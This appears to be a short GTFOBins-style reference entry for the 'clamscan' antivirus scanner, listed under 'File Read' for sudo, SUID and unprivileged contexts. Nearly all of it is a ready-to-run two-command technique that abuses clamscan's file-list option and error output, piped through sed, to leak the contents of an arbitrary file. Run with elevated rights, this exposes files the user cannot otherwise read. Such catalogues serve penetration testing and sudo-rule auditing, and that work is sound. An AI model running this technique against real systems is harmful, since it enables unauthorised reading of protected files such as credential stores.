title: clamscan
html:
clamscan

File Read

Context: sudo, suid, unprivileged

touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
excerpt: clamscan File Read Context: sudo, suid, unprivileged touch x.yara clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
